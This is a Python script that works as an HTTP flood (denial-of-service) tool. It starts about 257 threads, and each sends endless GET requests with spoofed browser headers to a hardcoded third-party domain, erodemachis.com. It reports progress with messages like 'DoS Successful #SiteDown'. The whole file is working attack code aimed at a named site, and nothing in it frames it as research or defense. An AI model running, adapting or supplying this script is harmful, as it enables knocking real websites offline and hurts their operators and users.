import requests
import threading
import time
from fake_headers import Headers
import random

global code

threads = 256
host = "https://erodemachis.com/"

l = []
rl = []
code = 000


def current_mil_time():
    return round(time.time() * 1000)


def current_sec_time():
    return round(time.time())


def count_resp_per_sec(time_took):
    t = current_sec_time()
    l.append(
        {
            "time_took": time_took,
            "time_received": t,
        }
    )

    for e in l:
        if current_sec_time() - e["time_received"] >= 1:
            try:
                l.remove(e)
            except:
                pass


def count_req_per_sec():
    t = current_sec_time()
    rl.append(
        {
            "time_received": t,
        }
    )

    for e in rl:
        if current_sec_time() - e["time_received"] >= 1:
            try:
                rl.remove(e)
            except:
                pass


message = "DoSing..."


def make_request(name):
    global code
    while True:
        count_req_per_sec()
        try:
            s = current_mil_time()
            headers = Headers(os="mac", headers=True).generate()
            r = requests.get(host, headers=headers)
            code = r.status_code
            t = current_mil_time() - s
            # print("Response code from thread #{}: {} took {} ms".format(name, str(r.status_code), t))
            count_resp_per_sec(t)
        except:
            message = "DoS Successful #SiteDown"


i = 0
while i <= threads:
    x = threading.Thread(target=make_request, args=(i,))
    print("Starting thread #{}...".format(i))
    x.start()
    i += 1

print("Calculating... wait for a while for it to adjust...")
while True:
    time.sleep(0.1)
    response_time = 0
    for e in l:
        response_time = response_time + e["time_took"]
    if (len(l)) > 0:
        response_time = response_time / len(l)
    if response_time > 60000:
        message = "DoS Successful #SiteDown:{}...".format(code)
    elif code == 500:
        message = "DoS Successful #ResourceLimitHacked:{}...".format(code)
    else:
        message = "DoSing -> {}...".format(code)
    print(
        "\rL: {}ms; R: {}; Rs: {}; {}".format(
            round(response_time, 2), len(rl), len(l), message
        ),
        end="",
    ),

